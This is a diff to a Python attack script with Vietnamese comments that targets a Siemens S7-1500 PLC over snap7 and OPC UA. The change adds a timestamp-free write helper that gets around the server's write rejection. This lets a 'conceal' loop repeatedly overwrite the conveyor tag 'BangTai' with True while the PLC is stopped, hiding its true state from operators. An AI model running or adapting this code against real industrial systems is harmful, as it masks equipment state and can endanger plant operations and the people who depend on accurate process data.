@@ -61,7 +61,7 @@ except ImportError:
     from snap7.types import Areas
 from snap7.util import get_bool, set_bool, get_dint
 
-from asyncua import Client
+from asyncua import Client, ua
 
 BANGTAI_NODE_ID = 'ns=3;s="BangTai"'
 CONCEAL_WRITE_INTERVAL_S = 0.15  # ghi lien tuc trong cua so STOP, phong truong hop PLC tu lam moi gia tri that
@@ -75,6 +75,23 @@ def read_cd1(client) -> int:
     return get_dint(client.read_area(Areas.MK, 0, 54, 4), 0)
 
 
+async def write_value_only(node, value: bool) -> None:
+    """asyncua's Node.write_value() always attaches SourceTimestamp (see
+    asyncua.common.ua_utils.value_to_datavalue) -- the S7-1500 OPC UA server
+    rejects that with BadWriteNotSupported ("does not support writing the
+    combination of value, status and timestamps provided"). Build a DataValue
+    with ONLY Value set (StatusCode/SourceTimestamp/ServerTimestamp all None)
+    and pass it straight through -- value_to_datavalue leaves an existing
+    ua.DataValue untouched, so this bypasses the auto-timestamp entirely."""
+    dv = ua.DataValue(
+        Value=ua.Variant(value, ua.VariantType.Boolean),
+        StatusCode=None,
+        SourceTimestamp=None,
+        ServerTimestamp=None,
+    )
+    await node.write_value(dv)
+
+
 async def probe_bangtai_writable(opc_url: str) -> None:
     """Thu ghi 1 lan (giu nguyen gia tri hien tai, chi ghi lai chinh no) de
     biet server co cho ghi BangTai khong TRUOC KHI chay toan bo kich ban --
@@ -84,7 +101,7 @@ async def probe_bangtai_writable(opc_url: str) -> None:
         async with Client(url=opc_url, timeout=5) as client:
             node = client.get_node(BANGTAI_NODE_ID)
             current = await node.read_value()
-            await node.write_value(current)
+            await write_value_only(node, current)
             probe_result["writable"] = True
             probe_result["error"] = None
             print(f"[+] Probe: BangTai chap nhan ghi (gia tri hien tai={current})")
@@ -110,7 +127,7 @@ async def opcua_conceal_loop(opc_url: str, stats: dict) -> None:
                 if concealment_active.is_set():
                     stats["attempts"] += 1
                     try:
-                        await node.write_value(True)
+                        await write_value_only(node, True)
                         stats["succeeded"] += 1
                     except Exception as e:
                         stats["failed"] += 1
